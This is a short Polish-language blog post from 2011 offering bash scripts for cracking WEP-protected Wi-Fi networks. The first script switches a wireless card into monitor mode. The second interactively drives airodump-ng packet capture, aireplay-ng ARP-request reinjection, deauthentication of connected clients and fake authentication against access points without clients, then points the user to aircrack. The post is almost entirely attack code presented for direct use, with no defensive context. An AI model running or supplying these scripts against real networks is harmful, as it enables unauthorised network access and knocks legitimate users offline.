---
title: Skrypt łamiący WEP
author: Przemek
type: post
date: 2011-12-01T23:35:00+00:00
url: /skrypt-lamiacy-wep/
bfa_virtual_template:
  - hierarchy
hits:
  - 324
dsq_thread_id:
  - 1017710848
categories:
  - Linux
tags:
  - wifi

---
Skrypt pomagający złamać zabezpieczenie sieci wifi &#8211; WEP

<!--more-->

1. Przełączanie karty WiFi do trybu monitor mode:

<pre class="lang:default highlight:0 decode:true">#! /bin/bash -x
x=wlan0
wlanconfig $x destroy
wlanconfig $x create wlandev wifi0 wlanmode managed
#ifconfig $x hw ether ca:fe:ca:fe:ca:fe
ifconfig $x up
#! /bin/bash -x
wlanconfig athX destroy
wlanconfig athX create wlandev wifi0 wlanmode monitor</pre>

&nbsp;

2. Łamanie WEP

<pre class="lang:default highlight:0 decode:true">#! /bin/bash

clear
echo " wpisz interfaejs sieciowy np; ath0"
read athx
echo " wprowadzam karte $athx w stan monitor"
if
wlanconfig $athx destroy
wlanconfig $athx create wlandev wifi0 wlanmode monitor &gt; /dev/null
ifconfig $athx up
then
echo " karta $athx monitor mode enable"
else
echo " jakis "error" sprawdz ustawienia karty"
echo " byc moze nie obsluguje monitor mode"
fi
clear
echo " wpisz odpowiedni bitrate dla karty np; 1, 11 , 54"
read bit &gt; /dev/null
M=M
iwconfig $athx biterate $bit$M
clear
echo " uruchamiam airodump-ng -c 0 --ivs -w pakiety $athx"
echo " wylukaj co i jak jak skonczysz wcisnij "ctrl-c""
echo " aby kontynulowac ;enter"
read enter &gt; /dev/null
airodump-ng --ivs -w pakiety $athx

echo " 1. Przeprowadz atak na ap z clientosami"
echo " 2. Przeprowadz atak na ap bez clientosow"
read y &gt; /dev/null
clear
case $y in 1)
echo " uruchamiam airodumpa wpisz odpowiednoi kanal"
read kanal &gt; /dev/hull
clear
aterm -geometry 65x15 -e airodump-ng -c $kanal --ivs -w pakiety $athx &

echo " uruchamiam ARP-request reinjection"
echo " uruchamiam deauthentication"
echo " wpisz mac apka"
read macap &gt; /dev/null
clear
echo " wpisz mac clienta"
read client &gt; /dev/null
clear
aterm -geometry 72x15 -e aireplay-ng -3 -b $macap -h $client $athx &
aterm -geometry 72x15 -e aireplay-ng -0 100 -a $macap -c $client $athx &
clear
echo " ...,,..,,...,,..,,..,,..,,..,,..,"
echo " ,zbieraj pakietsy & run aircarck."
echo " .,..,,..,,..,,..,,..,,..,,..,,.,,"
echo " mormo one person squad ;P"
read enter
esac
case $y in 2 )
echo " uruchamiam airodumpa wpisz odpowiednoi kanal"
read kanal2 &gt; /dev/hull
clear
aterm -geometry 65x15 -e airodump-ng -c $kanal2 --ivs -w pakiety $athx &

echo " uruchamiam ARP-request reinjection"
echo " uruchamiam fake-clientos"
echo " wpisz mac apka"
read macap2 &gt; /dev/null
echo " wpisz mac fake clienta"
read fake
echo "wpisz essid apka"
read essid

aterm -geometry 72x15 -e aireplay-ng -3 -b $macap2 -h $fake $athx &
aterm -geometry 72x15 -e aireplay-ng -1 0 -e $essid -a $macap2 -h $fake $athx &

clear
echo " ...,,..,,...,,..,,..,,..,,..,,..,"
echo " ,zbieraj pakietsy & run aircarck."
echo " .,..,,..,,..,,..,,..,,..,,..,,.,,"
echo " mormo one person squad ;P"

esac</pre>

&nbsp;